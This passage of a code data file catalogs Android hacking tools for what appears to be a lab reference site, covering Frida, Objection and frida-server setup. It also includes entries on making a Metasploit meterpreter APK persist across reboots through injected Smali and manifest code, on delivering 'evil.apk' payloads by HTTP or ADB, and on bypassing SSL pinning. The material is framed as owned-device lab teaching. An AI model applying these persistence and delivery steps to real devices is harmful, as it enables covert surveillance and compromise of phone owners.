        syntax: 'frida-ps -U',
        description:
          'Lists all running processes on the USB-connected Android device with their PIDs and names. Requires frida-server to be running on the device. Use this to find target app process names.',
        example: 'frida-ps -U',
        flags: [
          { flag: '-U', description: 'Target USB-connected device' },
          { flag: '-R', description: 'Target remote device' },
          { flag: '-a', description: 'List only running applications (not all processes)' },
        ],
      },
      {
        title: 'Find Camera Process',
        syntax: 'frida-ps -U | grep camera',
        description:
          'Filters the process list for any camera-related processes. Helps identify the exact package name of the camera app to target with a hook script.',
        example: 'frida-ps -U | grep -i camera',
      },
      {
        title: 'Spawn App and Hook',
        syntax: 'frida -U -f <package-name> -l <script.js> --no-pause',
        description:
          'Spawns the target app fresh and immediately applies the hook script. --no-pause resumes the app automatically after injection so it starts normally. Use this when you need to hook code that runs at app startup.',
        example: 'frida -U -f com.oppo.camera -l /home/kali/frida_scripts/camera_detect.js --no-pause',
        flags: [
          { flag: '-U', description: 'Target USB-connected device' },
          { flag: '-f <package>', description: 'Spawn this package (starts the app fresh)' },
          { flag: '-n <name>', description: 'Attach to already-running process by name' },
          { flag: '-l <script.js>', description: 'Load and inject this JavaScript hook script' },
          { flag: '--no-pause', description: 'Resume the app immediately after injection (required with -f)' },
        ],
      },
    ],
    useCases: [
      'Hook Camera2 API to detect and log every camera open event with call stack traces',
      'Intercept camera frame acquisition to study how apps handle preview data',
      'Block camera access to test app error handling and resilience to permission denial',
      'Study authentication logic, certificate pinning, and encryption by hooking Java methods',
      'Analyze runtime behavior of apps without decompiling or modifying the APK',
    ],
    tags: ['android', 'mobile', 'frida', 'instrumentation', 'hooking', 'javascript', 'camera', 'runtime', 'dynamic-analysis'],
    relatedTools: ['frida-server', 'objection', 'apktool'],
    installCommand: 'pip3 install frida-tools',
  },

  {
    name: 'Objection',
    slug: 'objection',
    category: 'Mobile Hacking',
    subcategory: 'Dynamic Instrumentation',
    difficulty: 'Advanced',
    description:
      'Runtime mobile exploration toolkit built on Frida — attach to Android apps and explore classes, hooks, permissions, and activities through an interactive shell without writing JavaScript.',
    longDescription:
      'Objection is a runtime mobile exploration toolkit powered by Frida. It abstracts Frida\'s JavaScript API into a convenient interactive command-line shell, making dynamic analysis accessible without needing to write hook scripts. After attaching to a running app with "objection -g com.package explore", you enter a REPL where you can list and hook classes, watch method calls, enumerate permissions, and trigger activities — all interactively. This makes it ideal for exploratory security testing: quickly mapping an app\'s class structure, finding interesting methods to investigate further, and verifying which permissions are active at runtime. Objection requires frida-server to be running on the target device (same version requirements as Frida). Common workflows: "android hooking list classes | grep -i camera" to find camera-related classes, "android hooking watch class android.hardware.camera2.CameraManager" to trace every method call on that class, "android permissions list" to see what permissions the app has been granted at runtime. For deeper customization, combine objection\'s built-in commands with custom Frida scripts injected via "import" within the objection shell.',
    commands: [
      {
        title: 'Attach to App',
        syntax: 'objection -g <package-name> explore',
        description:
          'Attaches to a running Android application by package name and opens the interactive objection REPL. The app must already be running. Requires frida-server on the device.',
        example: 'objection -g com.oppo.camera explore',
        flags: [
          { flag: '-g <package>', description: 'Target package name to attach to' },
        ],
      },
      {
        title: 'List All Classes',
        syntax: 'android hooking list classes',
        description:
          'Lists every loaded Java class in the running application. Pipe with grep to find classes of interest. Returns thousands of entries — filter aggressively.',
        example: 'android hooking list classes | grep -i camera',
      },
      {
        title: 'Watch All Methods on a Class',
        syntax: 'android hooking watch class <class-name>',
        description:
          'Instruments every method on the specified Java class and prints a log line every time any method is called, showing arguments and return values. Useful for understanding class behavior without writing a custom script.',
        example: 'android hooking watch class android.hardware.camera2.CameraManager',
      },
      {
        title: 'List Runtime Permissions',
        syntax: 'android permissions list',
        description:
          'Displays all Android permissions currently granted to the running application. Shows the actual runtime state — useful for comparing declared vs granted permissions.',
        example: 'android permissions list',
      },
      {
        title: 'List Activities',
        syntax: 'android hooking list activities',
        description:
          'Lists all Activity classes declared in the app\'s manifest. Combine with "android intent launch_activity" to start specific activities directly from the objection shell.',
        example: 'android hooking list activities',
      },
    ],
    useCases: [
      'Quickly explore an Android app\'s class structure without writing Frida scripts',
      'Watch all method calls on sensitive classes like CameraManager, MediaRecorder, or LocationManager',
      'Enumerate and compare declared vs runtime-granted permissions',
      'Map app activities for attack surface analysis',
      'Perform SSL pinning bypass and root detection bypass using objection\'s built-in modules',
    ],
    tags: ['android', 'mobile', 'objection', 'frida', 'dynamic-analysis', 'hooking', 'runtime', 'permissions'],
    relatedTools: ['frida', 'frida-server', 'apktool'],
    installCommand: 'pip3 install objection',
  },

  {
    name: 'frida-server (Android)',
    slug: 'frida-server',
    category: 'Mobile Hacking',
    subcategory: 'Dynamic Instrumentation',
    difficulty: 'Intermediate',
    description:
      'Deploy and run the Frida server daemon on an Android device to enable dynamic instrumentation from Kali — version and architecture matching are critical.',
    longDescription:
      'frida-server is the device-side daemon that Frida on Kali communicates with. It must be pushed to the Android device and started before any frida or objection commands will work. The critical requirements: (1) the frida-server version must exactly match the frida-tools version on Kali — even minor version differences cause "Failed to attach: unable to connect to remote frida-server"; (2) the frida-server binary must match the device CPU architecture. Use "adb shell getprop ro.product.cpu.abi" to determine architecture: arm64-v8a → download frida-server-X.X.X-android-arm64.xz; armeabi-v7a → download frida-server-X.X.X-android-arm.xz; x86 → android-x86; x86_64 → android-x86_64. Download from github.com/frida/frida/releases — find the version matching "frida --version" output. Push with adb push to /data/local/tmp/ (writable without root), chmod 755, and start with "adb shell \\"/data/local/tmp/frida-server &\\"". The & runs it in background. Verify with "adb shell ps | grep frida". Note: some Oppo firmwares restrict frida-server execution — in that case use Frida Gadget injection into the APK instead (see advanced Frida documentation).',
    commands: [
      {
        title: 'Check Device Architecture',
        syntax: 'adb shell getprop ro.product.cpu.abi',
        description:
          'Returns the CPU architecture of the Android device. Use this output to select the correct frida-server binary: arm64-v8a, armeabi-v7a, x86, or x86_64.',
        example: 'adb shell getprop ro.product.cpu.abi',
      },
      {
        title: 'Check Frida Version (for matching)',
        syntax: 'frida --version',
        description:
          'Shows the frida-tools version on Kali. Download frida-server with this exact version number from github.com/frida/frida/releases.',
        example: 'frida --version',
      },
      {
        title: 'Push frida-server to Device',
        syntax: 'adb push frida-server /data/local/tmp/frida-server',
        description:
          'Copies the frida-server binary to the device\'s /data/local/tmp/ directory, which is writable without root access. The source filename should be the extracted frida-server binary (after xz -d decompression).',
        example: 'adb push frida-server-16.2.1-android-arm64 /data/local/tmp/frida-server',
      },
      {
        title: 'Set Execute Permission',
        syntax: 'adb shell chmod 755 /data/local/tmp/frida-server',
        description:
          'Makes the frida-server binary executable on the device. Without this, the shell will return "Permission denied" when attempting to run it.',
        example: 'adb shell chmod 755 /data/local/tmp/frida-server',
      },
      {
        title: 'Start frida-server',
        syntax: 'adb shell "/data/local/tmp/frida-server &"',
        description:
          'Starts frida-server as a background process on the device. The quotes around the command and the & are required — without quotes, the & applies to adb shell rather than the remote command.',
        example: 'adb shell "/data/local/tmp/frida-server &"',
      },
      {
        title: 'Verify frida-server is Running',
        syntax: 'adb shell ps | grep frida',
        description:
          'Checks the device process list for the frida-server process. A running frida-server shows its PID and process path. If nothing appears, frida-server failed to start — check permissions and architecture match.',
        example: 'adb shell ps | grep frida',
      },
    ],
    useCases: [
      'Enable Frida and Objection dynamic instrumentation on Android test devices',
      'Set up the device-side component of the Frida instrumentation pipeline',
      'Understand version and architecture dependency management for mobile tooling',
      'Troubleshoot frida-server deployment issues (permission, architecture, version mismatch)',
    ],
    tags: ['android', 'mobile', 'frida', 'frida-server', 'instrumentation', 'adb', 'arm64'],
    relatedTools: ['frida', 'objection', 'adb'],
    installCommand: 'pip3 install frida-tools  # then download frida-server binary from github.com/frida/frida/releases',
  },

  {
    name: 'Android Persistence',
    slug: 'android-persistence',
    category: 'Mobile Hacking',
    subcategory: 'Post-Exploitation',
    difficulty: 'Advanced',
    description:
      'Make Android payloads survive device restarts using BOOT_COMPLETED broadcast receivers, AlarmManager scheduling, or Metasploit\'s built-in persistence module.',
    longDescription:
      `The stock msfvenom APK loses its meterpreter session when the phone restarts or Android kills the background process. Persistence techniques make the payload auto-start every time the phone boots or reconnect on a schedule.

**Why persistence is harder on Android 10:** Android 8+ introduced severe restrictions on background services. Android 10 (Oppo A15s) goes further — apps cannot start services from the background unless declared as foreground services or triggered by specific system events like BOOT_COMPLETED.

**Method 1 — BOOT_COMPLETED BroadcastReceiver (Smali injection):**
Add to AndroidManifest.xml inside \`<manifest>\`:
\`\`\`xml
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
\`\`\`
Add inside \`<application>\`:
\`\`\`xml
<receiver android:name="com.metasploit.stage.PayloadTrustManager"
    android:enabled="true" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</receiver>
\`\`\`

Create the receiver Smali file at \`smali/com/metasploit/stage/PayloadTrustManager.smali\`:
\`\`\`smali
.class public Lcom/metasploit/stage/PayloadTrustManager;
.super Landroid/content/BroadcastReceiver;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 3
    invoke-static {p1}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
    return-void
.end method
\`\`\`

**Method 2 — AlarmManager:** Schedule periodic reconnections using android.app.AlarmManager + PendingIntent in Smali. Research topic for advanced labs.

**Method 3 — Built-in Metasploit module:** Use \`run post/android/manage/persistence\` inside an active meterpreter session for automated persistence setup.

**Always clean up after lab:** \`adb uninstall com.metasploit.stage\` removes all registered receivers and services.`,
    commands: [
      {
        title: 'Decompile Payload APK for Modification',
        syntax: 'apktool d /home/kali/evil.apk -o /home/kali/persist_decompiled/',
        description:
          'Decompiles the msfvenom-generated APK to Smali so the manifest and Smali code can be edited to add persistence.',
        example: 'apktool d /home/kali/evil.apk -o /home/kali/persist_decompiled/',
      },
      {
        title: 'Rebuild Persistent APK',
        syntax: 'apktool b /home/kali/persist_decompiled/ -o /home/kali/persistent.apk',
        description:
          'Rebuilds the modified APK after adding the BOOT_COMPLETED receiver to the manifest and Smali files. Must be signed with apksigner before installation.',
        example: 'apktool b /home/kali/persist_decompiled/ -o /home/kali/persistent.apk',
      },
      {
        title: 'Use Metasploit Persistence Module',
        syntax: 'run post/android/manage/persistence',
        description:
          'Runs the built-in Android persistence module from within an active meterpreter session. Automatically configures the payload to survive device restarts. Use "show options" first to review available settings.',
        example: 'run post/android/manage/persistence',
      },
      {
        title: 'Verify Receiver Registration',
        syntax: 'adb shell dumpsys package com.metasploit.stage | grep -A5 "Receiver"',
        description:
          'Confirms the BOOT_COMPLETED receiver is properly registered by dumping the app\'s package info and filtering for receiver declarations.',
        example: 'adb shell dumpsys package com.metasploit.stage | grep -A5 "Receiver"',
      },
      {
        title: 'Test Persistence (Restart Device)',
        syntax: 'adb reboot',
        description:
          'Reboots the test device via ADB to verify that the BOOT_COMPLETED receiver triggers and re-establishes a meterpreter session automatically after boot. Watch the Metasploit listener for an incoming connection.',
        example: 'adb reboot',
      },
      {
        title: 'Remove Persistence (Cleanup)',
        syntax: 'adb uninstall com.metasploit.stage',
        description:
          'Removes the persistent payload APK entirely, which deregisters all broadcast receivers and services. Run this after every lab session. Verify removal with "adb shell pm list packages | grep metasploit".',
        example: 'adb uninstall com.metasploit.stage',
      },
    ],
    useCases: [
      'Understand how Android malware survives device restarts through BOOT_COMPLETED receivers',
      'Study Android background service restrictions and how they affect persistence mechanisms',
      'Learn Smali injection techniques by adding broadcast receivers to existing APKs',
      'Test incident response procedures by simulating persistent payloads on owned devices',
      'Research AlarmManager-based reconnection for understanding scheduled background execution',
    ],
    tags: ['android', 'mobile', 'persistence', 'boot', 'smali', 'broadcast-receiver', 'meterpreter', 'post-exploitation'],
    relatedTools: ['meterpreter-android', 'apktool', 'apksigner', 'msfvenom-android'],
  },

  {
    name: 'Android Payload Delivery',
    slug: 'android-payload-delivery',
    category: 'Mobile Hacking',
    subcategory: 'Payload Delivery',
    difficulty: 'Beginner',
    description:
      'Three methods for delivering APK payloads to Android test devices: USB ADB install, WiFi HTTP server download, and WiFi ADB remote install.',
    longDescription:
      'After generating an Android payload APK with msfvenom, there are three practical delivery methods for lab testing — each representing a different real-world attack scenario. Method 1 (USB ADB): requires physical access to the device with USB debugging enabled. Fast and reliable for lab work. Run "adb install" after connecting via USB and authorizing the debugging prompt. Method 2 (WiFi HTTP server): the most realistic attack simulation. Host the APK on a Python HTTP server on Kali, then access the URL from the target device\'s browser. The device must allow installation from unknown sources (Chrome must be permitted in Settings → Install unknown apps). This mirrors how drive-by APK delivery works. Method 3 (WiFi ADB): connect ADB over the network without a USB cable. Requires either a brief USB connection first to enable TCP mode (adb tcpip 5555), or enabling Wireless Debugging in Developer Options. After connecting wirelessly, install with the standard adb install command. For all methods: the Metasploit handler must be started (Step 3 of the lab) before triggering the payload app on the device, or the reverse connection will fail silently. Troubleshooting: if no session opens, verify LHOST IP matches actual Kali IP ("ip a"), check both devices are on the same WiFi, and ensure port 4444 is not blocked by firewall ("sudo ufw allow 4444").',
    commands: [
      {
        title: 'Method 1: USB ADB Install',
        syntax: 'adb install /home/kali/evil.apk',
        description:
          'Installs the APK directly over USB. Requires USB debugging enabled and the USB authorization popup accepted on the device. The fastest and most reliable delivery method for lab work.',
        example: 'adb install /home/kali/evil.apk',
      },
      {
        title: 'Method 2: Host APK via HTTP Server',
        syntax: 'cd /home/kali && python3 -m http.server 8080',
        description:
          'Starts a Python web server in the Kali home directory on port 8080. The target device can then download the APK by navigating to http://<KALI_IP>:8080/evil.apk in its browser. This mirrors the most realistic remote delivery scenario.',
        example: 'cd /home/kali && python3 -m http.server 8080',
      },
      {
        title: 'Method 3: Enable WiFi ADB (USB first)',
        syntax: 'adb tcpip 5555 && adb connect <PHONE_IP>:5555',
        description:
          'Switches ADB to TCP mode over USB, then connects wirelessly. After this, disconnect the USB cable — adb commands continue to work over WiFi. Install the APK with the standard adb install command.',
        example: 'adb tcpip 5555 && adb connect 192.168.1.8:5555 && adb install /home/kali/evil.apk',
      },
      {
        title: 'Method 3: Enable WiFi ADB (No USB)',
        syntax: 'adb connect <PHONE_IP>:5555',
        description:
          'Connects to ADB over WiFi when Wireless Debugging is already enabled in Developer Options on the device (no USB required). The device shows its IP and port in Settings → Developer Options → Wireless Debugging.',
        example: 'adb connect 192.168.1.8:5555',
      },
      {
        title: 'Open Firewall for Listener Port',
        syntax: 'sudo ufw allow 4444 && sudo ufw allow 8080',
        description:
          'Opens firewall ports for the Metasploit listener (4444) and HTTP server (8080) on Kali. If the firewall is blocking connections, sessions will not open even with a correctly configured listener.',
        example: 'sudo ufw allow 4444',
      },
      {
        title: 'Verify HTTP Server is Accessible',
        syntax: 'curl http://localhost:8080/evil.apk -o /dev/null -w "%{http_code}"',
        description:
          'Tests that the Python HTTP server is serving the APK correctly from Kali before attempting to download from the device. Should return 200.',
        example: 'curl http://localhost:8080/evil.apk -o /dev/null -w "%{http_code}"',
      },
    ],
    useCases: [
      'Practice USB physical access APK deployment in a controlled lab environment',
      'Simulate drive-by download APK delivery via HTTP server',
      'Test wireless ADB deployment for same-network attack scenarios',
      'Understand why "Allow installation from unknown sources" is a dangerous Android setting',
      'Learn the prerequisites and failure modes of each delivery method',
    ],
    tags: ['android', 'mobile', 'apk', 'delivery', 'adb', 'http-server', 'wifi', 'usb', 'install'],
    relatedTools: ['adb', 'msfvenom-android', 'metasploit-android', 'android-developer-options'],
  },

  {
    name: 'Android Developer Options',
    slug: 'android-developer-options',
    category: 'Mobile Hacking',
    subcategory: 'Device Setup',
    difficulty: 'Beginner',
    description:
      'Enable Developer Options and USB Debugging on Android devices — required for ADB access. Covers both Oppo/ColorOS and generic Android paths.',
    longDescription:
      'Developer Options is a hidden Android settings menu that unlocks low-level device controls including USB Debugging (required for ADB), Install via USB, and Wireless Debugging. It is hidden by default on all Android devices to prevent accidental changes by regular users. To unlock it, tap the Build Number entry 7 times rapidly — Android displays a countdown and then "You are now a developer!" The Build Number location varies by manufacturer: stock Android and most devices use Settings → About Phone → Build Number; Oppo/ColorOS (including the A15s lab device) uses Settings → About Phone → Software Information → Build Number. After enabling Developer Options, navigate to Settings → Additional Settings → Developer Options (Oppo) or Settings → Developer Options (stock Android) to enable USB Debugging and Install via USB. For WiFi ADB without a USB cable (Android 11+), enable Wireless Debugging in the same menu. When connecting via USB for the first time, the device shows an RSA key authorization popup — tap "Always allow from this computer" to avoid the popup on future connections. Security note: Developer Options with USB Debugging enabled is a significant attack surface — disable it on devices not actively being used for security research.',
    commands: [
      {
        title: 'Oppo/ColorOS: Navigate to Build Number',
        syntax: 'Settings → About Phone → Software Information → Build Number (tap 7 times)',
        description:
          'The Oppo A15s and other ColorOS devices have an extra "Software Information" submenu before Build Number. Tap Build Number 7 times rapidly — enter your screen PIN if prompted. "You are now a developer!" confirms success.',
        example: 'Settings → About Phone → Software Information → Build Number',
      },
      {
        title: 'Generic Android: Navigate to Build Number',
        syntax: 'Settings → About Phone → Build Number (tap 7 times)',
        description:
          'On stock Android (Pixel, Android One) and most non-Oppo devices, Build Number is directly under About Phone. Some Samsung devices use Settings → About Phone → Software Information → Build Number.',
        example: 'Settings → About Phone → Build Number',
      },
      {
        title: 'Enable USB Debugging (Oppo)',
        syntax: 'Settings → Additional Settings → Developer Options → USB Debugging → ON',
        description:
          'Turns on USB Debugging for ADB access over USB. Also enable "Install via USB" in the same menu to allow APK installation via adb install.',
        example: 'Settings → Additional Settings → Developer Options → USB Debugging → ON',
      },
      {
        title: 'Enable USB Debugging (Generic Android)',
        syntax: 'Settings → Developer Options → USB Debugging → ON',
        description:
          'Enables USB Debugging on stock Android devices. Developer Options appears directly under Settings (or System on some versions) after Build Number has been tapped 7 times.',
        example: 'Settings → Developer Options → USB Debugging → ON',
      },
      {
        title: 'Enable Wireless Debugging (Android 11+)',
        syntax: 'Settings → Developer Options → Wireless Debugging → ON',
        description:
          'Enables ADB over WiFi without needing a USB cable first. Available on Android 11 and later. After enabling, the screen shows the device IP and port to use with "adb connect <IP>:<PORT>".',
        example: 'Settings → Developer Options → Wireless Debugging → ON',
      },
      {
        title: 'Authorize ADB Connection',
        syntax: 'adb devices  # then tap Allow on device popup',
        description:
          'Running "adb devices" on Kali triggers an RSA key authorization popup on the Android device. Tap "Always allow from this computer" to permanently authorize the Kali machine and avoid repeated prompts.',
        example: 'adb devices',
      },
    ],
    useCases: [
      'Prepare an owned Android device for ADB-based security research and lab exercises',
      'Understand what Developer Options exposes and why it should be disabled on production devices',
      'Set up both USB and WiFi ADB modes for different lab scenarios',
      'Learn device-specific paths for Oppo/ColorOS vs stock Android setups',
    ],
    tags: ['android', 'mobile', 'developer-options', 'usb-debugging', 'adb', 'setup', 'oppo', 'coloros'],
    relatedTools: ['adb', 'android-payload-delivery', 'frida-server'],
  },
]
